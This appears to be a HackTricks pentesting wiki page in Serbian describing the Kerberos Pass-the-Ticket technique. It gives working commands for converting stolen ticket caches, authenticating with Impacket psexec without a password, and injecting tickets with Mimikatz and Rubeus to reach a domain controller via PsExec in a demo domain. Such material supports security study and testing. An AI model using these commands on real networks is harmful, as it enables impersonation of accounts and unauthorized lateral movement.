# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pregled

U Pass-the-Ticket (PtT) napadu, napadač koristi ukradeni Kerberos ticket za autentifikaciju kao principal tog ticketa, bez posedovanja lozinke tog naloga. Ticket-granting ticket (TGT) može da se koristi za zahtev za service ticketima, dok je ukradeni service ticket ograničen na ciljnu uslugu i period važenja.<sup>[[1]](#references)</sup>

Za tehnike pribavljanja ticketa pogledajte:

- [Prikupljanje ticketa iz Windows sistema](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Prikupljanje ticketa iz Linux sistema](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Konvertovanje Linux i Windows formata ticketa

Kerberos kešovi se na Linux sistemima najčešće pojavljuju kao MIT `ccache` fajlovi, a na Windows sistemima kao `.kirbi` fajlovi. `ticket_converter` konvertuje ove formate koristeći ulazni ticket i izlaznu putanju.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo takođe obezbeđuje alate za rad sa Kerberos ticketima na Windowsu.<sup>[[3]](#references)</sup>

## Korišćenje Ticketa

Na Linuxu, postavite `KRB5CCNAME` da pokazuje na cache i uputite Impacket klijenta da koristi Kerberos bez traženja lozinke:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Na Windows-u, Mimikatz ili Rubeus mogu da uvezu `.kirbi` ticket u trenutnu logon sesiju. Koristite `klist` da pregledate rezultujući cache.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Uvoz ticket-a ne dodeljuje privilegije koje prevazilaze one predstavljene ticket-om i politikom autorizacije ciljne usluge. Istekli, opozvani, neispravni ili ticket-i sa pogrešno definisanim scope-om mogu biti odbijeni.<sup>[[1]](#references)</sup>

Za širi kontekst Kerberos napada i povezane tehnike pribavljanja ticket-a, pogledajte Tarlogic vodič kroz Kerberos napade.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket primeri](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos tehnike napada](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
